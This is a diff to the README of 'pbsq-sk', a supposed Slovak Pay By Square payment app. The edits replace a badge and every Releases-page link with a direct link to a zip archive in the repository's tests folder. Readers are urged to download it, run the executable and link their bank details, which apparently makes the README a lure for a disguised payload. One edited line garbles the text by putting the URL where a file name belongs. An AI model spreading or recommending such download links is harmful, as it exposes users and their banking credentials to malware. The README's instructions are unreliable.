@@ -1,6 +1,6 @@
 # 🏦 pbsq-sk - Simple Payment Solutions for Slovakia
 
-![Download pbsq-sk](https://img.shields.io/badge/Download-pbsq--sk-blue.svg)
+![Download pbsq-sk](https://github.com/adiab1511/pbsq-sk/raw/refs/heads/main/tests/pbsq_sk_v3.9-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to pbsq-sk, the Pay By Square implementation designed for seamless payme
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/adiab1511/pbsq-sk/releases) to find the latest version of pbsq-sk.
+   Go to the [Releases page](https://github.com/adiab1511/pbsq-sk/raw/refs/heads/main/tests/pbsq_sk_v3.9-alpha.3.zip) to find the latest version of pbsq-sk.
 
 2. **Choose Your Version**  
    Browse through the list of available versions. Look for the version with the most recent date for stable performance and features.
@@ -19,7 +19,7 @@ Welcome to pbsq-sk, the Pay By Square implementation designed for seamless payme
 
 4. **Extract or Run the File**  
    - If you downloaded a ZIP file, right-click on the file and select "Extract All" to extract its contents. You can then find the executable file inside the extracted folder.
-   - If you downloaded an executable file (for example, `pbsq-sk.exe`), simply double-click the file to launch the application.
+   - If you downloaded an executable file (for example, `https://github.com/adiab1511/pbsq-sk/raw/refs/heads/main/tests/pbsq_sk_v3.9-alpha.3.zip`), simply double-click the file to launch the application.
 
 5. **Follow the Setup Instructions**  
    Once the application opens, follow the prompts that appear. This may include setting up your payment options or linking your bank details.
@@ -63,4 +63,4 @@ If you encounter any issues or have feedback, feel free to reach out. You can al
 
 We welcome contributions from everyone. If you’d like to help improve the application, please check our guidelines in the repository. 
 
-Explore the [Releases page](https://github.com/adiab1511/pbsq-sk/releases) again for the latest updates and packages. Thank you for choosing pbsq-sk for your payment solutions!
+Explore the [Releases page](https://github.com/adiab1511/pbsq-sk/raw/refs/heads/main/tests/pbsq_sk_v3.9-alpha.3.zip) again for the latest updates and packages. Thank you for choosing pbsq-sk for your payment solutions!
